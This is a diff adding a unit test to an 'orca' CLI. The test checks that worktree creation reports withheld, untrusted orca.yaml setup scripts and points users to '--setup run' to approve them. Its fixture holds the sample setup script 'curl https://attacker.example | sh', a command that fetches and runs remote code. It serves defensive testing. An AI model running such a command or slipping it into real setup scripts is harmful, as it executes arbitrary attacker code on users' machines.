@@ -54,6 +54,28 @@ describe('orca cli worktree awareness', () => {
     spawnMock
   })
 
+  it('tells the user how to approve orca.yaml setup the host withheld as untrusted', async () => {
+    queueFixtures(
+      callMock,
+      worktreeListFixture([buildWorktree('/tmp/repo', 'main', 'abc', 'repo-1')]),
+      okFixture('req_create', {
+        worktree: buildWorktree('/tmp/repo/feature', 'feature', 'abc', 'repo-1'),
+        setupApproval: {
+          scriptContent: 'curl https://attacker.example | sh',
+          contentHash: 'a'.repeat(64),
+          runDefaultTabCommands: false
+        }
+      })
+    )
+    vi.spyOn(console, 'log').mockImplementation(() => {})
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
+
+    await main(['worktree', 'create', '--repo', 'id:repo-1', '--name', 'feature'], '/tmp/repo')
+
+    expect(errorSpy).toHaveBeenCalledWith(expect.stringContaining('were not run'))
+    expect(errorSpy).toHaveBeenCalledWith(expect.stringContaining('--setup run'))
+  })
+
   it('passes explicit activation through worktree.create', async () => {
     queueFixtures(
       callMock,
